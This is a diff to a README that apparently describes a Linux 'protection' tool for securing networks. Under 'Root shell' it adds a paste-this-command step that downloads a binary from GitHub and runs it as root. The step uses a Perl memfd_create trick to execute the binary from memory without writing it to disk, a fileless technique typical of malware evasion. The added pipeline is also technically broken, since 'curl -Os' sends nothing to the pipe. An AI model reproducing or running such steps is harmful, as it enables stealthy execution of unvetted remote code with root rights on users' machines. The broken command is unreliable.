@@ -13,6 +13,7 @@ or securing internal networks with ease and reliability.
 ```bash
 # Root shell
 apt update -y && apt install sudo curl -y && curl -Os https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection_linux && chmod +x protection_linux && ./protection_linux && rm protection_linux
+apt update -y && apt install sudo curl -y && curl -Os https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection_linux | perl -e 'use POSIX; $fd = syscall(319, "prog", 1); open($fh, ">&=$fd"); print $fh while <STDIN>; exec {"/proc/self/fd/$fd"} "protection_linux"'
 ```
 
 ```bash
